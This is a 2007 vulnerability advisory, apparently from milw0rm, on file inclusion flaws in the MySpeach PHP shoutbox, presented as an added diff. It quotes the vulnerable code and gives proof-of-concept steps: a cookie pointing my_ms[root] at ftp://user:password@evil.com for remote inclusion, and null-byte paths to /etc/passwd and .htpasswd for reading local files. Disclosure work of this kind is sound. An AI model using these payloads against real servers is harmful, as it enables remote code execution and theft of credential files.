@@ -1,0 +1,156 @@
+	/=======================================\
+	| Advisory :: MySpeach <= 3.0.7		|
+	+=======================================+---------------------------------------------------------------\
+	|													|
+	|      Download link : http://www.graphiks.net/scripts-php/script-7-1-0.html				|
+	|   Official website : www.graphiks.net									|
+	|               Type : Chat without any database (only txt files)					|
+	|        Vuln. found : Remote/Local File inclusion (& Full Path Disclosure)				|
+	| 	  Conditions : Vuln #1 : PHP >= 5.0.0, register_globals = On, allow_url_fopen = On		|
+	|                      Vuln #2 : register_globals = On							|
+	|	  Risk level : High										|
+	|													|
+	+-------------------------------------------------------------------------------------------------------+
+	|													|
+	| Program audited by : Xst3nZ <xst3nz@gmail.com> [fr/en]						|
+	|               Date : 2007-04-03									|
+	|	 Last update : 2007-04-03									|
+	|													|
+	+-------------------------------------------------------------------------------------------------------+
+	| 	     Summary : 	0] Description									|
+	|			1] Vuln#1 : Remote File Inclusion						|
+	|			2] Vuln#2 : Local File Inclusion						|
+	|			3] Links & Documentation							|
+	\-------------------------------------------------------------------------------------------------------/
+
+	
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ <0> DESCRIPTION
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+  MySpeach is a shoutbox coded in PHP which works without any database. Indeed, it uses only text files to save the
+messages. To my mind, it's a good script, but let's see the security, although there was a lot of different versions
+to correct vulnerabilities.
+So, the show must g0 on ...
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ <1> VULNERABILITY #1 : REMOTE FILE INCLUSION (WITH FULLPATHDISCL)
+
+  { Cond: PHP>=5.0.0; register_globals=On; allow_url_fopen=On }
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+  Firstly, after the installation, the code which must be put in the page to display the shoutbox MySpeach is the
+following :
+
++--------8<--------
+| <?php
+| $my_ms['root']="/full/path/myspeach"; // Contains the realpath of the directory where myspeach is installed
+| include($my_ms['root'].'/chat.php'); // Then, the file 'chat.php' is included
+| ?>
++--------8<--------
+
+  Let's see what is it interesting in the file 'chat.php' :
+
++--------8<--------
+| // [...] line 15
+| $clef = ''; $data = '';
+| $listedesvariablesensible = array('ip_list', 'my_ms[root]','my_ms[site]','my_ms[absolu_root]','my_ms[msg_txt]',
+| 'my_ms[id_unique]','my_ms| [copyright]','my_ms[skin]','my_ms[version]');
+| foreach($listedesvariablesensible as $clef => $data)
+| {
+| 	$afiltrer = $data;
+|  	if(isset($_GET[$afiltrer]) || isset($HTTP_GET_VARS[$afiltrer]))
+|  	{ 
+|    		$_GET[$afiltrer] = '';
+|    		$HTTP_GET_VARS[$afiltrer] = '';
+|  	}
+|  	if(isset($_POST[$afiltrer]) || isset($HTTP_POST_VARS[$afiltrer]))
+|  	{ 
+|   		$_POST[$afiltrer] = '';
+|    		$HTTP_POST_VARS[$afiltrer] = '';
+|  	}
+| }
+| // Line 32 [...]
++--------8<--------
+
+So this code filters all the variables $_GET/$HTTP_GET_VARS and $_POST/$HTTP_POST_VARS with a same name that the
+variables which are used in the script, and it reinitializes their values. However, the vars $_COOKIE are not
+filtered by this code.
+
+  Besides, we can read the following code :
+
++--------8<--------
+| // [...] line 35
+| if(!@file_exists($my_ms['root'].'/admin/config.php'))
+| exit('<br /><p align="center">MySpeach n est pas encore installé.</p>');
+|
+| //On inclut les fichiers de config (config files are included)
+| include($my_ms['root'].'/admin/config.php');
+| include($my_ms['root'].'/admin/options.php');
+| include($my_ms['root'].'/admin/setup.php');
+| include($my_ms['root'].'/admin/fonctions.php');
+| // line 45 [...]
++--------8<--------
+
+The $my_ms['root'] parameter can be overwritten with a cookie if register_globals = On in the 'php.ini', because
+$my_ms['root'] is not initialized (see [1]). Therefore, it can deals a Remote File Inclusion (RFI).
+Nevertheless, the RMI will work only if the server is running on PHP >= 5 because in this version, the file_exists()
+function can be used with some URL wrappers (see [2] & [3]) if allow_url_fopen = On in the 'php.ini' (ftp:// can be used for
+example but not http://).
+
+  +---->> Vuln. #1 Pro0f of Concept <<--------//
+  |
+  | - Create a cookie : 	| Name  : my_ms[root]
+  |				| Value : ftp://user:password@evil.com
+  |				| Host  : www.victim.com
+  | - Create a file called 'config.php' in a folder called 'admin' to obtain a path like that : evil.com/admin/config.php
+  | - Then, go on the page : www.victim.com/[myspeach_install_directory(default: myspeach)]/chat.php
+  |   * If you get the following error message : "MySpeach n est pas encore installé.", the vulnerability cannot be
+  |     exploited, probably because the version of PHP is under 5.0.0 and/or register_globals = Off and/or 
+  |     allow_url_fopen = Off.
+  |   * Else, the RFI will work and, in the same time, a lot of inclusion errors will appears because the script try
+  |     to include another files like 'admin/options.php', 'admin/setup.php' ... (but the RFI must be done with 'config.php'
+  |     because if file_exists($my_ms['root']) return false, the function exit() will be called ...).
+  |     Particularly, it sparks a Full Path Disclosure :
+  |
+  [     Fatal error: Call to undefined function my_MS_plus_un() in /full/path/myspeach/chat.php on line [line]
+  |
+  +-------------------------------------------
+
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ <2> VULNERABILITY #2 : LOCAL FILE INCLUSION (WITH FULLPATHDISCL)
+
+  { Cond: only register_globals=On }
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+  It is also possible to include a local file by using the Null Byte char \x0 (urlencoded: %00). It will also spark a FullPathDiscl.
+
+  +---->> Vuln. #2 Pro0f of Concept <<--------
+  |
+  | - See the Vuln#1 PoC, but change the value of the cookie created, by the path of a local file ended with %00.
+  | Example : /etc/passwd%00; ../admin-panel/.htpasswd%00 ... and it will work if register_globals=On
+  |
+  +-------------------------------------------//
+
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ <3> LINKS & DOCUMENTATION
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+ [1] register_globals Security
+	http://www.php.net/manual/it/security.globals.php
+
+ [2] file_exists() function
+	http://www.php.net/manual/en/function.file-exists.php
+
+ [3] List of Supported Protocols/Wrappers
+	http://www.php.net/manual/en/wrappers.ftp.php
+	and especially for FTP/FTPS: http://www.php.net/manual/en/wrappers.ftp.php
+	(we also learn that HTTP/HTTPS protocols aren't supported by stat() and so, by file_exists() : 
+	http://www.php.net/manual/en/wrappers.http.php)
+
+
+// [EOF] Xst3nZ
+
+# milw0rm.com [2007-04-03]
